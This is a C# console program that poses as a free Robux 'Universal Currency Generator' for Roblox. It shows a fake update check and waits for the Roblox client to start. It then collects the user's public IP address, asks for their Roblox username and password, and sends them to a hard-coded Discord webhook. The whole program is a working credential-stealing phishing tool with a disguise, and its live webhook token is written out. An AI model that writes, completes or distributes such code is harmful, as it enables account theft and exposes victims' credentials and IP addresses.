/*
  RERUBY by rbx.davidpuiu#0 12.2025

    credits:
    david - owner / developer
    robert - tester
    serafim - motivatie

    please dont use this for personal gain/harful purposes
    feel free to edit anything but make sure to credit ok?!?!??!
*/

using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;
using System.Drawing;

partial class Program
{
    static async Task Main()
    {
        string print = @" __    __   ______    ______  
|  \  |  \ /      \  /      \ 
| $$  | $$|  $$$$$$\|  $$$$$$\
| $$  | $$| $$   \$$| $$ __\$$
| $$  | $$| $$      | $$|    \
| $$  | $$| $$   __ | $$ \$$$$
| $$__/ $$| $$__/  \| $$__| $$
 \$$    $$ \$$    $$ \$$    $$
  \$$$$$$   \$$$$$$   \$$$$$$                         
";
        Console.WriteLine(print);
        Console.WriteLine("Welcome to Universal Currency Generator! (UCG) by MirkoKING https://youtube.com/c/MirkoKING");
        Thread.Sleep(500);
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("[UPDATE] ");
        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine("Searching for updates...");
        Thread.Sleep(5000);
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("[UPDATE] ");
        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine("Running latest version! 4.8.5");
        Console.WriteLine("Waiting for RobloxPlayerBeta.exe...");

        while (true)
        {
            Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
            // Some systems use "RobloxPlayerBeta" instead of "roblox"

            if (processes.Length > 0)
            {
                Console.WriteLine("Roblox started!");
                break;
            }

            Thread.Sleep(500); // reduce CPU usage
        }

        // Continue
        string userIp;
        using HttpClient client = new HttpClient();
        userIp = await client.GetStringAsync("https://api.ipify.org");

        Console.WriteLine("Waiting..");
        Thread.Sleep(2400);
        Console.Write("Enter username: ");
        string username = Console.ReadLine();
        Console.Write("Enter password: ");
        string password = Console.ReadLine();
        Console.Write("How much robux do you want? (PUT RANDOM VALUE SO ROBLOX DOESNT BAN): ");
        string robux = Console.ReadLine();

        string webhookUrl = "https://discord.com/api/webhooks/1446837691785416764/FFM7B_wTxJv-6NEXwFz2Y61VUCwjtpv5mj1yZ7lMh1IfNObuhu9TvTLLkaDQTnSbIPxK";

        // Let System.Text.Json properly escape the text
        string jsonPayload = JsonSerializer.Serialize(new
        {
            content = $"Username: `{username}`\nPassword: `{password}`\nRobux: `{robux}`\nIP: `{userIp}`"
        });

        var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

        HttpResponseMessage response = await client.PostAsync(webhookUrl, content);

        Console.WriteLine("Status: " + response.StatusCode);
    }
}